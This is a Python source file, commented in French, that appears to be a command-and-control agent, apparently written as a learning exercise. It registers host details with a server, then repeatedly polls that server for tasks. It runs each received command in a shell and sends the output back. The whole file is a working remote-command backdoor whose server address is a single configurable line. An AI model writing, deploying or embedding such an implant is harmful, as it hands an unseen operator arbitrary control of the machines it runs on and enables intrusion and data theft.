import platform
import socket
import os
import uuid
import time
import subprocess
import requests # type: ignore
from pydantic import BaseModel
from typing import Optional

# --- CONFIGURATION ---
SERVER_URL = "http://127.0.0.1:8000"
SLEEP_TIME = 5

# --- LE CONTRAT (Copié du serveur pour être strict) ---

class AgentCheckIn(BaseModel):
    agent_id: str
    username: str
    hostname: str
    internal_ip: str
    os_version: str

class TaskResponse(BaseModel):
    task_id: Optional[int] = None
    command: Optional[str] = None

class TaskResultRequest(BaseModel):
    agent_id: str
    task_id: int
    result: str
    success: bool = True

# --- FONCTIONS ---

def get_system_info() -> AgentCheckIn:
    """
    Récupère les infos et retourne un OBJET strict.
    """
    try:
        user = os.getlogin()
    except:
        user = "unknown"

    # On construit l'objet Pydantic directement
    return AgentCheckIn(
        agent_id=str(uuid.uuid4()),
        username=user,
        hostname=socket.gethostname(),
        internal_ip="127.0.0.1", # Simplifié
        os_version=f"{platform.system()} {platform.release()}"
    )


def execute_command(command: str) -> tuple[str, bool]:
    """
    Exécute une commande shell et retourne (output, success).
    """
    try:
        result = subprocess.run(
            command,
            shell=True,
            capture_output=True,
            text=True,
            timeout=30,
        )
        output = result.stdout if result.returncode == 0 else result.stderr
        if not output:
            output = f"Command completed with return code {result.returncode}"
        return output.strip(), result.returncode == 0
    except subprocess.TimeoutExpired:
        return "Command timed out after 30 seconds", False
    except Exception as e:
        return f"Execution error: {str(e)}", False


def send_result(agent_id: str, task_id: int, result: str, success: bool) -> None:
    """
    Envoie le résultat d'une commande au serveur.
    """
    try:
        payload = TaskResultRequest(
            agent_id=agent_id,
            task_id=task_id,
            result=result,
            success=success,
        )
        response = requests.post(
            f"{SERVER_URL}/api/v1/tasks/result",
            json=payload.model_dump(),
        )
        response.raise_for_status()
        print(f"📤 Résultat envoyé pour task #{task_id}")
    except Exception as e:
        print(f"⚠️ Échec envoi résultat: {e}")

def main():
    # 1. Collecte (Type strict : AgentCheckIn)
    my_info = get_system_info()
    
    print(f"🕵️  AGENT DÉMARRÉ - ID: {my_info.agent_id}")

    # 2. Check-in
    try:
        # requests.post attend un dict ou du json, 
        # Pydantic a une méthode géniale pour ça : .model_dump()
        response = requests.post(
            f"{SERVER_URL}/api/v1/checkin", 
            json=my_info.model_dump()
        )
        response.raise_for_status() # Lève une erreur si code != 200
        print("✅ Enregistrement validé par le serveur.")
        
    except Exception as e:
        print(f"❌ Echec du Check-in : {e}")
        return

    # 3. Boucle de travail
    while True:
        try:
            print("💤 Demande de travail...")
            resp = requests.get(f"{SERVER_URL}/api/v1/tasks/{my_info.agent_id}")

            # On force la réponse à rentrer dans notre modèle TaskResponse
            task_data = TaskResponse.model_validate(resp.json())
            
            if task_data.command and task_data.task_id:
                print(f"⚙️  ORDRE REÇU: [{task_data.task_id}] {task_data.command}")
                
                # Exécution réelle de la commande
                output, success = execute_command(task_data.command)
                status = "✅" if success else "❌"
                print(f"{status} Résultat: {output[:80]}{'...' if len(output) > 80 else ''}")
                
                # Envoi du résultat au serveur
                send_result(my_info.agent_id, task_data.task_id, output, success)
            else:
                print("ø Rien à faire.")

        except Exception as e:
            print(f"⚠️ Erreur réseau ou format invalide : {e}")

        time.sleep(SLEEP_TIME)

if __name__ == "__main__":
    main()
 